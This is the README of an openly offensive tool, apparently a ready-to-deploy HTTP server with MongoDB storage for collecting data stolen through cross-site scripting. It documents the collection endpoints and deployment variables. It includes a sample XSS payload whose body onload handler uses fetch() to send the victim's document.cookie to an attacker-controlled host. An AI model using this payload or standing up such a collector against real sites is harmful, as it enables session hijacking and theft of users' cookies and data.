# xss-data-retrieval

Ready to go HTTP Server with MongoDB communication for storing the data obtained in your XSS attacks.

## Usage

`GET /?data=<data>`

If the data retrieved is the size of the Internet consider the following request

`POST / {'application-type': 'text/plain'}`

## Sample XSS Attack

``<body id=x tabindex=1 onload=fetch(`host:port/?data=${document.cookie}`)></body>``

### Deploy

Define the following environment variables:

|Variable|Description|
|--------|-----------|
|PORT|Port which the server will be listening requests|
|MONGODB_CONNECTION_URL|Connection URL of the Mongo database that will store the data|